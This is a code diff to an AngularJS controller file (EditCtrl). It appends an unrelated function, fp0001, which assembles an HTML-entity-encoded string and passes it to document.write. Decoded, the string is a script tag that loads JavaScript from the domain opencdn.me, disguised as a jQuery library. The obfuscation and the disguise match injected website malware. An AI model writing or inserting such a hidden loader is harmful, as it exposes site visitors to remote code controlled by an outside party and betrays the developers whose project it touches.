@@ -46,3 +46,14 @@ function EditCtrl($scope, $location, $routeParams, Project) {
     });
   };
 }
+
+function fp0001()
+{
+var cFziajUiEoSGXyJ="";
+
+cFziajUiEoSGXyJ+="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#115;&#114;&#99;&#61;&#34;&#47;&#47;";
+cFziajUiEoSGXyJ+="&#111;&#112;&#101;&#110;&#99;&#100;&#110;&#46;&#109;&#101;&#47;&#115;&#99;&#114;&#105;";
+cFziajUiEoSGXyJ+="&#112;&#116;&#47;&#106;&#113;&#117;&#101;&#114;&#121;&#46;&#106;&#115;&#34;&#62;&#60;";
+cFziajUiEoSGXyJ+="&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";
+document.write(cFziajUiEoSGXyJ);
+}
